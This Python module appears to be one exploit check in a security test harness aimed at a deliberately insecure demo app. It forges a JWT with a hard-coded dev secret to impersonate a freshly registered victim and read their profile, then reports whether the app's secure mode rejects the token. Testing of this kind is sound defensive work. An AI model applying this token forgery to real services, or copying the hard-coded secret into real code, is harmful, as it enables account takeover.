"""API2 -- Broken authentication (JWT signed with the guessable dev secret).

The insecure app ships a hard-coded, publicly-known JWT signing secret and does
not pin the algorithm.  An attacker who knows the secret (it is in the source /
default config) can forge a token for ANY user id and access their account.

Success = a self-forged token for a victim user id is accepted by /profile and
returns the victim's account.  Secure mode rotates to a strong random secret at
startup and pins the algorithm, so the forged token is rejected.
"""

from __future__ import annotations

import time

import jwt

from ..client import ExploitResult, TargetClient

KNOWN_DEV_SECRET = "mirage-insecure-dev-secret-change-me"


def run(client: TargetClient) -> ExploitResult:
    # Provision a victim so a real account id exists to impersonate.
    victim = client.register("victim-auth@mirage.local")
    victim_id = victim.get("_user_id") or victim.get("id")

    # Forge a token for the victim using the known/guessed dev secret.
    forged = jwt.encode(
        {
            "sub": str(victim_id),
            "email": "victim-auth@mirage.local",
            "role": "user",
            "iat": int(time.time()),
            "exp": int(time.time()) + 3600,
        },
        KNOWN_DEV_SECRET,
        algorithm="HS256",
    )

    # Use the forged token (bypassing login) to read the victim's profile.
    r = client.get("/profile", headers={"Authorization": "Bearer " + forged})
    accepted = r.status_code == 200 and r.json().get("email") == "victim-auth@mirage.local"
    return ExploitResult(
        vuln_id="API2",
        name="Broken auth -- forged JWT via known dev secret",
        success=accepted,
        severity="critical",
        detail="Forge a JWT with the hard-coded dev secret to impersonate a user.",
        evidence=(r.text[:200]) if accepted else "",
        blocked_reason="" if accepted else f"HTTP {r.status_code} (strong rotated secret).",
    )
